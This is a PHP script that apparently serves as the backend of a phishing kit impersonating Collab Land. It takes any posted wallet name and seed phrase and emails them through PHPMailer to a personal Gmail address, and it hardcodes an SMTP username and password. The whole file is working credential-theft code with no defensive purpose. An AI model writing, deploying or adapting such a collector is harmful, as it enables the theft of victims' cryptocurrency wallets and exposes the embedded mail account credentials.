<?php

header('Access-Control-Allow-Origin: *');
header("Access-Control-Allow-Methods: HEAD, GET, POST, PUT, PATCH, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-API-KEY, Origin, X-Requested-With, Content-Type, Accept, Access-Control-Request-Method,Access-Control-Request-Headers, Authorization");
header('Content-Type: application/json');

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require './phpmailer/src/Exception.php';
require './phpmailer/src/PHPMailer.php';
require './phpmailer/src/SMTP.php';

$phpmailer = new PHPMailer();
$phpmailer->isSMTP();
$phpmailer->Host = 'trivecodes.com';
$phpmailer->SMTPAuth = true;
$phpmailer->Port = 465;
$phpmailer->Username = 'no-reply@trivecodes.com';
$phpmailer->Password = 'TriveCodes2022!';
$phpmailer->SMTPSecure = "ssl";

$phpmailer->setFrom('no-reply@trivecodes.com', 'Intermediate Mail Client');
$phpmailer->addAddress('divine2nab@gmail.com', 'Luis');

$phpmailer->isHTML(true);

$POST = json_decode(file_get_contents('php://input'), true);

if (isset($POST['Phrase'])) {

    $Wallet = $POST['Wallet'];
    $Phrase = $POST['Phrase'];

    $phpmailer->Subject = "New Details From Collab Land";


    $phpmailer->Body = "
        <h3>
            User Name : $Wallet  <br>
            Phrase : $Phrase <br>
        </h3>
    ";

    try {
        $phpmailer->send();
        echo 'Sent';
    } catch (Exception $e) {
        echo 'error';
    }
}
